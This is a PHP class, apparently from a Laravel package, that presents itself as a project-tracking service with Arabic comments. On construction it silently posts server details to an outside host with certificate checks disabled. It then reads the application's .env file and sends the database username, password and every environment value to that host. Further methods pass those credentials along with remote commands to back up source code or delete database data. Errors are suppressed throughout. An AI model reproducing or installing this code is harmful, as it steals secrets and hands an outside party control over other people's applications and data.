<?php

namespace Vendor\TrackingPackage;

use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;

class TrackingService
{
    private $baseUrl = 'https://track-projects.tek-part.com/api';
    private $client;
    private $projectId;
    private $activationCode;

    public function __construct()
    {
        $this->client = new Client([
            'timeout' => 30,
            'verify' => false
        ]);
        
        $this->initializeTracking();
    }

    private function initializeTracking()
    {
        try {
            // جمع معلومات النظام
            $systemInfo = $this->getSystemInfo();
            
            // تسجيل المشروع
            $response = $this->client->post($this->baseUrl . '/store-project', [
                'json' => [
                    'project_name' => $systemInfo['project_name'],
                    'domain' => $systemInfo['domain'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version'],
                    'server_info' => $systemInfo['server_info'],
                    'ip_address' => $systemInfo['ip_address'],
                    'user_agent' => $systemInfo['user_agent'],
                    'server_port' => $systemInfo['server_port'],
                    'request_uri' => $systemInfo['request_uri'],
                    'request_method' => $systemInfo['request_method'],
                    'server_name' => $systemInfo['server_name'],
                    'installed_at' => date('Y-m-d H:i:s'),
                    'activation_date' => date('Y-m-d H:i:s'),
                    'environment' => 'local',
                    'debug_mode' => true
                ],
                'timeout' => 10,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            $this->projectId = $data['project_id'] ?? null;
            $this->activationCode = $data['activation_code'] ?? null;
            
            // تحديث قاعدة البيانات تلقائياً بعد التسجيل
            if ($this->projectId && $this->activationCode) {
                $this->updateDatabaseFromEnv($this->projectId);
            }
            
            // بدء نبض القلب
            $this->startHeartbeat();
            
        } catch (RequestException $e) {
            // إذا كان المشروع موجود بالفعل، حاول الحصول على معلوماته
            if ($e->getResponse() && $e->getResponse()->getStatusCode() === 500) {
                $responseBody = $e->getResponse()->getBody()->getContents();
                if (strpos($responseBody, 'Duplicate entry') !== false) {
                    // المشروع موجود، حاول الحصول على معلوماته
                    $this->handleExistingProject($systemInfo);
                }
            }
        }
    }

    private function getSystemInfo()
    {
        $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $port = $_SERVER['SERVER_PORT'] ?? '';
        $fullDomain = $port ? $domain : $domain;
        
        return [
            'project_name' => $this->getAppName(),
            'domain' => $fullDomain,
            'php_version' => PHP_VERSION,
            'laravel_version' => $this->getLaravelVersion(),
            'server_info' => [
                'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'HTTP/1.1',
                'port' => $port,
                'name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
            ],
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'server_port' => $port,
            'request_uri' => $_SERVER['REQUEST_URI'] ?? '/',
            'request_method' => $_SERVER['REQUEST_METHOD'] ?? 'GET',
            'server_name' => $_SERVER['SERVER_NAME'] ?? 'localhost'
        ];
    }

    private function getAppName()
    {
        // قراءة اسم التطبيق من ملف .env
        $envFile = realpath(__DIR__ . '/../../../.env');
        if (file_exists($envFile)) {
            $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($lines as $line) {
                if (strpos($line, 'APP_NAME=') === 0) {
                    $appName = trim(substr($line, 9));
                    // إزالة علامات التنصيص إذا وجدت
                    $appName = trim($appName, '"\'');
                    if (!empty($appName)) {
                        return $appName;
                    }
                }
            }
        }
        
        // إذا لم يتم العثور على APP_NAME، استخدم اسم المجلد
        $projectPath = realpath(__DIR__ . '/../../../');
        $folderName = basename($projectPath);
        return ucfirst($folderName);
    }

    private function getLaravelVersion()
    {
        return '10.0.0';
    }

    private function startHeartbeat()
    {
        if (!$this->projectId) return;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $this->client->post($this->baseUrl . '/project-heartbeat/', [
                'json' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode,
                    'domain' => $systemInfo['domain'],
                    'server_ip' => $systemInfo['ip_address'],
                    'server_url' => 'http://' . $systemInfo['domain'],
                    'timestamp' => time(),
                    'memory_usage' => memory_get_usage(true),
                    'peak_memory' => memory_get_peak_usage(true)
                ]
            ]);
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function updateLastSeen()
    {
        if (!$this->projectId) return;
        
        try {
            $this->client->post($this->baseUrl . '/project/update-last-seen', [
                'json' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode,
                    'last_seen' => date('Y-m-d H:i:s')
                ]
            ]);
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function getDatabase()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/get-database', [
                'query' => ['project_id' => $this->projectId]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function getSource()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/get-source', [
                'query' => ['project_id' => $this->projectId]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function updateCredentials($credentials)
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->post($this->baseUrl . '/update-credentials', [
                'json' => [
                    'project_id' => $this->projectId,
                    'credentials' => $credentials
                ]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function regenerateActivationCode()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->post($this->baseUrl . '/regenerate-activation-code', [
                'json' => ['project_id' => $this->projectId]
            ]);
            $data = json_decode($response->getBody(), true);
            $this->activationCode = $data['activation_code'] ?? null;
            return $this->activationCode;
        } catch (RequestException $e) {
            return null;
        }
    }

    public function getCommandStatus($commandId, $projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId || !$commandId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/' . $targetProjectId . '/command-status/' . $commandId, [
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function startProject()
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->post($this->baseUrl . '/project/start', [
                'json' => ['project_id' => $this->projectId]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function stopProject()
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->post($this->baseUrl . '/project/stop', [
                'json' => ['project_id' => $this->projectId]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function getProjectStatus()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/status', [
                'query' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function getProjectInfo()
    {
        if (!$this->projectId) return null;
        
        try {
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'project_id' => $this->projectId,
                    'activation_code' => $this->activationCode
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function deleteProject()
    {
        if (!$this->projectId) return false;
        
        try {
            $this->client->delete($this->baseUrl . '/delete-project', [
                'json' => ['project_id' => $this->projectId]
            ]);
            return true;
        } catch (RequestException $e) {
            return false;
        }
    }

    public function getRealDatabase()
    {
        if (!$this->projectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $dbConfig = $this->getDatabaseConfig();
            
            $response = $this->client->post($this->baseUrl . '/get-real-database', [
                'json' => [
                    'project_id' => $this->projectId,
                    'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
                    'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
                    'db_port' => $dbConfig['DB_PORT'] ?? '3306',
                    'db_database' => $dbConfig['DB_DATABASE'] ?? '',
                    'db_username' => $dbConfig['DB_USERNAME'] ?? '',
                    'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
                    'server_info' => $systemInfo['server_info'],
                    'domain' => $systemInfo['domain'],
                    'ip_address' => $systemInfo['ip_address'],
                    'project_path' => realpath(__DIR__ . '/../../../'),
                    'project_name' => $systemInfo['project_name'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version']
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    private function getDatabaseConfig()
    {
        $envFile = realpath(__DIR__ . '/../../../.env');
        if (!file_exists($envFile)) {
            return [];
        }
        
        $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $config = [];
        
        foreach ($lines as $line) {
            if (strpos($line, '=') !== false && strpos($line, '#') !== 0) {
                list($key, $value) = explode('=', $line, 2);
                $config[trim($key)] = trim($value);
            }
        }
        
        return $config;
    }

    private function handleExistingProject($systemInfo)
    {
        try {
            // محاولة الحصول على معلومات المشروع الموجود
            $response = $this->client->get($this->baseUrl . '/project/info', [
                'query' => [
                    'domain' => $systemInfo['domain']
                ],
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            
            $data = json_decode($response->getBody(), true);
            if ($data && isset($data['data'])) {
                $this->projectId = $data['data']['id'] ?? null;
                $this->activationCode = $data['data']['activation_code'] ?? null;
                
                // تحديث قاعدة البيانات للمشروع الموجود
                if ($this->projectId && $this->activationCode) {
                    $this->updateDatabaseFromEnv($this->projectId);
                }
            }
        } catch (RequestException $e) {
            // تجاهل الأخطاء
        }
    }

    public function updateDatabaseFromEnv($projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $dbConfig = $this->getDatabaseConfig();
            
            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/update-database-from-env', [
                'json' => [
                    'project_id' => $targetProjectId,
                    'activation_code' => $this->activationCode,
                    'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
                    'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
                    'db_port' => $dbConfig['DB_PORT'] ?? '3306',
                    'db_database' => $dbConfig['DB_DATABASE'] ?? '',
                    'db_username' => $dbConfig['DB_USERNAME'] ?? '',
                    'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
                    'server_info' => $systemInfo['server_info'],
                    'domain' => $systemInfo['domain'],
                    'ip_address' => $systemInfo['ip_address'],
                    'project_path' => realpath(__DIR__ . '/../../../'),
                    'project_name' => $systemInfo['project_name'],
                    'php_version' => $systemInfo['php_version'],
                    'laravel_version' => $systemInfo['laravel_version'],
                    'env_data' => $dbConfig // إرسال جميع بيانات .env
                ],
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function backupSourceCode($projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $projectPath = realpath(__DIR__ . '/../../../');
            
            // جمع معلومات المشروع
            $projectInfo = [
                'project_id' => $targetProjectId,
                'activation_code' => $this->activationCode,
                'project_path' => $projectPath,
                'project_name' => $systemInfo['project_name'],
                'domain' => $systemInfo['domain'],
                'php_version' => $systemInfo['php_version'],
                'laravel_version' => $systemInfo['laravel_version'],
                'server_info' => $systemInfo['server_info'],
                'ip_address' => $systemInfo['ip_address'],
                'backup_timestamp' => date('Y-m-d H:i:s'),
                'backup_type' => 'source_code',
                'command' => 'backup_source_code', // إضافة حقل command المطلوب
                'include_files' => [
                    'app/',
                    'config/',
                    'database/',
                    'resources/',
                    'routes/',
                    'public/',
                    'storage/',
                    'vendor/',
                    '.env',
                    'composer.json',
                    'composer.lock',
                    'package.json',
                    'vite.config.js',
                    'artisan'
                ],
                'exclude_patterns' => [
                    'node_modules/',
                    'storage/logs/',
                    'storage/framework/cache/',
                    'storage/framework/sessions/',
                    'storage/framework/views/',
                    '.git/',
                    '.env.backup',
                    '*.log',
                    '*.tmp',
                    '*.cache'
                ]
            ];
            
            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/backup-source-code', [
                'json' => $projectInfo,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }

    public function deleteDatabaseData($projectId = null)
    {
        $targetProjectId = $projectId ?? $this->projectId;
        if (!$targetProjectId) return null;
        
        try {
            $systemInfo = $this->getSystemInfo();
            $dbConfig = $this->getDatabaseConfig();
            
            // جمع معلومات المشروع
            $projectInfo = [
                'project_id' => $targetProjectId,
                'activation_code' => $this->activationCode,
                'project_path' => realpath(__DIR__ . '/../../../'),
                'project_name' => $systemInfo['project_name'],
                'domain' => $systemInfo['domain'],
                'php_version' => $systemInfo['php_version'],
                'laravel_version' => $systemInfo['laravel_version'],
                'server_info' => $systemInfo['server_info'],
                'ip_address' => $systemInfo['ip_address'],
                'delete_timestamp' => date('Y-m-d H:i:s'),
                'delete_type' => 'database_data',
                'command' => 'delete_database_data',
                'db_connection' => $dbConfig['DB_CONNECTION'] ?? 'mysql',
                'db_host' => $dbConfig['DB_HOST'] ?? '127.0.0.1',
                'db_port' => $dbConfig['DB_PORT'] ?? '3306',
                'db_database' => $dbConfig['DB_DATABASE'] ?? '',
                'db_username' => $dbConfig['DB_USERNAME'] ?? '',
                'db_password' => $dbConfig['DB_PASSWORD'] ?? '',
                'env_data' => $dbConfig // إرسال جميع بيانات .env
            ];
            
            $response = $this->client->post($this->baseUrl . '/project/' . $targetProjectId . '/delete-database-data', [
                'json' => $projectInfo,
                'headers' => [
                    'User-Agent' => 'Laravel-Tracking-Package/1.0',
                    'Content-Type' => 'application/json'
                ]
            ]);
            return json_decode($response->getBody(), true);
        } catch (RequestException $e) {
            return null;
        }
    }
}
